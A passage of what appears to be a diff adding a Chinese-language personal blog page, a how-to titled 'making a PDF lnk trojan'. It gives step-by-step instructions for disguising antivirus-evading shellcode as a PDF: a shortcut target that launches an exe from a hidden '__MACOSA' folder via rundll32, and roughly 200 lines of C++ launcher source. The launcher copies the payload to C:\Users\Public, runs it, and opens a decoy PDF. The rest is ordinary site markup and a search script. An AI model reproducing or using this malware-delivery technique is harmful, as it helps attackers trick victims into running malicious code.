@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="linyulo" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      制作PDF lnk马 
+      
+      
+      |
+    
+     你好，陌生人
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">雨記</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">制作PDF lnk马</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2026-09-08 14:56:12
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h2 id="00x1"><a href="#00x1" class="headerlink" title="00x1"></a>00x1</h2><p>生成一个shellcode，免杀后重命名calc.exe，找到一个正常的PDF文档，发送到桌面创建快捷方式</p>
+<p><img src="/images/Pasted%20image%2020260908142750.png" alt="Pasted image 20260908142750.png"></p>
+<h2 id="00x2"><a href="#00x2" class="headerlink" title="00x2"></a>00x2</h2><p>修改属性目标</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\rundll32.exe url.dll,FileProtocolHandler &quot;.__MACOSA\__MACOSA\__MACOSA\__MACOSA\__MACOSA\__MACOSA\a_calc_pdf_x64.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="00x3"><a href="#00x3" class="headerlink" title="00x3"></a>00x3</h2><p>创建一个文件夹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\21544\Desktop\新建文件夹\.__MACOSA\__MACOSA\__MACOSA\__MACOSA\__MACOSA\__MACOSA</span><br></pre></td></tr></table></figure>
+
+<h2 id="00x4"><a href="#00x4" class="headerlink" title="00x4"></a>00x4</h2><p>当前目录下放 c2、正常 PDF、c 脚本</p>
+<p><img src="/images/Pasted%20image%2020260908143227.png" alt="Pasted image 20260908143227.png"></p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WIN32_LEAN_AND_MEAN</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#include &lt;windows.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;shellapi.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#include &lt;cstddef&gt;</span></span><br><span class="line"><span class="meta">#include &lt;cstdio&gt;</span></span><br><span class="line"><span class="meta">#include &lt;cstring&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_MSC_VER)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, &quot;Shell32.lib&quot;)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路径缓冲区长度和硬编码字符串沿用原程序的取值。</span></span><br><span class="line">constexpr std::size_t kPathCapacity = <span class="number">0x104</span>;       <span class="comment">// 路径缓冲区固定为 260 字节</span></span><br><span class="line">constexpr <span class="built_in">char</span> kArchiveMarker[] = <span class="string">&quot;__MACOSA&quot;</span>;     <span class="comment">// 样本中的原始拼写是 X，不是目录里的 __MACOSA</span></span><br><span class="line">constexpr <span class="built_in">char</span> kPdfExtension[] = <span class="string">&quot;.pdf&quot;</span>;</span><br><span class="line">constexpr <span class="built_in">char</span> kPublicCalc[] = <span class="string">&quot;C:\\Users\\Public\\calc.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line">template &lt;std::size_t Capacity, typename... Args&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">format_string</span>(<span class="params"><span class="built_in">char</span> (&amp;output</span>)[Capacity], <span class="keyword">const</span> <span class="built_in">char</span>* format, Args... <span class="keyword">args</span>)</span> &#123;</span><br><span class="line">    sprintf_s(output, Capacity, format, <span class="keyword">args</span>...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先复制当前目录；如果路径中包含 &quot;__MACOXA&quot;，则向前查找反斜杠并在该位置截断，</span></span><br><span class="line"><span class="comment">// 从而得到标记目录之前的上层目录。实际样本目录使用的是 __MACOSA，因此通常不会命中。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">derive_parent_directory</span>(<span class="params"><span class="keyword">const</span> <span class="built_in">char</span>* source, <span class="built_in">char</span> (&amp;destination</span>)[kPathCapacity])</span> &#123;</span><br><span class="line">    destination[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (strcpy_s(destination, kPathCapacity, source) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 搜索样本中写死的特殊目录标记。</span></span><br><span class="line">    <span class="built_in">char</span>* marker = std::strstr(destination, kArchiveMarker);</span><br><span class="line">    <span class="keyword">if</span> (marker == nullptr || marker &lt;= destination) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 按原汇编逻辑，从标记前一个字符开始反向寻找目录分隔符。</span></span><br><span class="line">    <span class="built_in">char</span>* cursor = marker - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (cursor &lt;= destination) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (*cursor != <span class="string">&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">        --cursor;</span><br><span class="line">        <span class="keyword">if</span> (cursor == destination) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cursor &gt; destination) &#123;</span><br><span class="line">        *cursor = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 FindFirstFileA/FindNextFileA 枚举目录，跳过子目录，并返回枚举到的第一个 PDF。</span></span><br><span class="line"><span class="comment">// 扩展名比较不区分大小写，因此 .pdf、.PDF 等都会被识别。</span></span><br><span class="line"><span class="function"><span class="built_in">bool</span> <span class="title">find_first_pdf</span>(<span class="params"><span class="keyword">const</span> <span class="built_in">char</span>* directory, <span class="built_in">char</span> (&amp;pdf_name</span>)[kPathCapacity])</span> &#123;</span><br><span class="line">    <span class="built_in">char</span> search_pattern[kPathCapacity] = &#123;&#125;;</span><br><span class="line">    format_string(search_pattern, <span class="string">&quot;%s\\*&quot;</span>, directory);</span><br><span class="line"></span><br><span class="line">    WIN32_FIND_DATAA find_data = &#123;&#125;;</span><br><span class="line">    HANDLE find_handle = FindFirstFileA(search_pattern, &amp;find_data);</span><br><span class="line">    <span class="keyword">if</span> (find_handle == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">bool</span> found = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((find_data.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 只检查文件名最后一个点之后的扩展名。</span></span><br><span class="line">        <span class="keyword">const</span> <span class="built_in">char</span>* extension = std::strrchr(find_data.cFileName, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (extension == nullptr || _stricmp(extension, kPdfExtension) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        strcpy_s(pdf_name, kPathCapacity, find_data.cFileName);</span><br><span class="line">        found = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> (FindNextFileA(find_handle, &amp;find_data));</span><br><span class="line"></span><br><span class="line">    FindClose(find_handle);</span><br><span class="line">    <span class="keyword">return</span> found;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// calc.exe 是当前版本唯一需要检查的外部 EXE。</span></span><br><span class="line"><span class="comment">// 文件必须存在，并且不能是一个同名目录。</span></span><br><span class="line"><span class="function"><span class="built_in">bool</span> <span class="title">is_regular_file</span>(<span class="params"><span class="keyword">const</span> <span class="built_in">char</span>* path</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> DWORD attributes = GetFileAttributesA(path);</span><br><span class="line">    <span class="keyword">return</span> attributes != INVALID_FILE_ATTRIBUTES &amp;&amp;</span><br><span class="line">           (attributes &amp; FILE_ATTRIBUTE_DIRECTORY) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 复现样本的文件复制策略：CopyFileA 的第三个参数为 FALSE，允许覆盖已有文件；</span></span><br><span class="line"><span class="comment">// 如果首次复制失败，则先删除目标文件，再重试一次。最终结果不参与后续分支判断。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_with_sample_retry</span>(<span class="params"><span class="keyword">const</span> <span class="built_in">char</span>* source, <span class="keyword">const</span> <span class="built_in">char</span>* destination</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (CopyFileA(source, destination, FALSE) == FALSE) &#123;</span><br><span class="line">        DeleteFileA(destination);</span><br><span class="line">        CopyFileA(source, destination, FALSE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">reconstructed_main</span>()</span> &#123;</span><br><span class="line">    <span class="comment">// 第一步：获取当前 a.exe 的完整路径。</span></span><br><span class="line">    <span class="built_in">char</span> executable_path[kPathCapacity] = &#123;&#125;;</span><br><span class="line">    GetModuleFileNameA(nullptr, executable_path, static_cast&lt;DWORD&gt;(<span class="keyword">sizeof</span>(executable_path)));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除路径末尾的文件名，得到 a.exe 所在目录。</span></span><br><span class="line">    <span class="built_in">char</span> current_directory[kPathCapacity] = &#123;&#125;;</span><br><span class="line">    strcpy_s(current_directory, kPathCapacity, executable_path);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">char</span>* last_separator = std::strrchr(current_directory, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (last_separator != nullptr) &#123;</span><br><span class="line">        *last_separator = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据 __MACOXA 标记计算候选上层目录；未命中时两个目录相同。</span></span><br><span class="line">    <span class="built_in">char</span> derived_directory[kPathCapacity] = &#123;&#125;;</span><br><span class="line">    derive_parent_directory(current_directory, derived_directory);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 优先在 a.exe 当前目录寻找 PDF；找不到时再到候选上层目录寻找。</span></span><br><span class="line">    <span class="built_in">char</span> pdf_name[kPathCapacity] = &#123;&#125;;</span><br><span class="line">    <span class="built_in">bool</span> has_pdf = find_first_pdf(current_directory, pdf_name);</span><br><span class="line">    <span class="keyword">if</span> (!has_pdf) &#123;</span><br><span class="line">        has_pdf = find_first_pdf(derived_directory, pdf_name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// PDF 是后续行为的触发条件：两个目录都没有 PDF 时直接返回 1，</span></span><br><span class="line">    <span class="comment">// 不复制文件，也不启动 calc.exe。</span></span><br><span class="line">    <span class="keyword">if</span> (!has_pdf) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造当前目录中的 calc.exe 和 PDF 路径，以及最终要打开的 PDF 路径。</span></span><br><span class="line">    <span class="built_in">char</span> current_calc[kPathCapacity] = &#123;&#125;;</span><br><span class="line">    <span class="built_in">char</span> current_pdf[kPathCapacity] = &#123;&#125;;</span><br><span class="line">    <span class="built_in">char</span> derived_pdf[kPathCapacity] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    format_string(current_calc, <span class="string">&quot;%s\\calc.exe&quot;</span>, current_directory);</span><br><span class="line">    format_string(current_pdf, <span class="string">&quot;%s\\%s&quot;</span>, current_directory, pdf_name);</span><br><span class="line">    format_string(derived_pdf, <span class="string">&quot;%s\\%s&quot;</span>, derived_directory, pdf_name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只检查当前目录中的 calc.exe。</span></span><br><span class="line">    <span class="keyword">if</span> (!is_regular_file(current_calc)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 calc.exe 复制到所有用户可访问的 C:\Users\Public 目录。</span></span><br><span class="line">    copy_with_sample_retry(current_calc, kPublicCalc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 以正常可见方式启动 Public\calc.exe。</span></span><br><span class="line">    <span class="comment">// 不提供命令行和特殊创建标志，启动成功后只关闭句柄，不等待计算器退出。</span></span><br><span class="line">    STARTUPINFOA calculator_startup = &#123;&#125;;</span><br><span class="line">    calculator_startup.cb = <span class="keyword">sizeof</span>(calculator_startup);</span><br><span class="line">    calculator_startup.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">    calculator_startup.wShowWindow = SW_SHOW;</span><br><span class="line"></span><br><span class="line">    PROCESS_INFORMATION calculator_process = &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span> (CreateProcessA(</span><br><span class="line">            kPublicCalc,</span><br><span class="line">            nullptr,</span><br><span class="line">            nullptr,</span><br><span class="line">            nullptr,</span><br><span class="line">            FALSE,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            nullptr,</span><br><span class="line">            nullptr,</span><br><span class="line">            &amp;calculator_startup,</span><br><span class="line">            &amp;calculator_process) != FALSE) &#123;</span><br><span class="line">        CloseHandle(calculator_process.hProcess);</span><br><span class="line">        CloseHandle(calculator_process.hThread);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 固定等待 1000 毫秒，使计算器先显示出来。</span></span><br><span class="line">    Sleep(<span class="number">0x3E8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 PDF 源路径和目标路径不同，则将 PDF 复制到候选上层目录。</span></span><br><span class="line">    <span class="comment">// 当前样本中 __MACOXA 与实际 __MACOSA 不一致，所以两条路径通常相同并跳过复制。</span></span><br><span class="line">    <span class="keyword">if</span> (std::strcmp(current_pdf, derived_pdf) != <span class="number">0</span>) &#123;</span><br><span class="line">        CopyFileA(current_pdf, derived_pdf, FALSE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过系统默认文件关联打开 PDF，窗口显示方式为 SW_SHOW。</span></span><br><span class="line">    <span class="comment">// derived_directory 同时作为 ShellExecuteA 的工作目录。</span></span><br><span class="line">    ShellExecuteA(nullptr, <span class="string">&quot;open&quot;</span>, derived_pdf, nullptr, derived_directory, SW_SHOW);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// PDF 打开请求发出后结束程序。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">// namespace</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">int</span> WINAPI <span class="title">WinMain</span>(<span class="params">HINSTANCE, HINSTANCE, LPSTR, <span class="built_in">int</span></span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 原样本为 Windows GUI 子系统程序，入口最终进入上述重构业务函数。</span></span><br><span class="line">    <span class="keyword">return</span> reconstructed_main();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2026/05/27/Agent/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2026-09-08 14:56:12
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#00x1"><span class="toc-text">00x1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00x2"><span class="toc-text">00x2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00x3"><span class="toc-text">00x3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00x4"><span class="toc-text">00x4</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/AixLfly">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+        <li>
+          
+              <a title="twitter" target="_blank" rel="noopener" href="https://x.com/yeyushengfanQAQ">
+                <i class="iconfont icon-twitter"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        Copyright © 2026 aixfly
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">祝你开心，不开心也可以</a>
+        
+    </div>
+  
+  
+</div>
+
+<script src="/js/live2d-loader.js"></script>
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
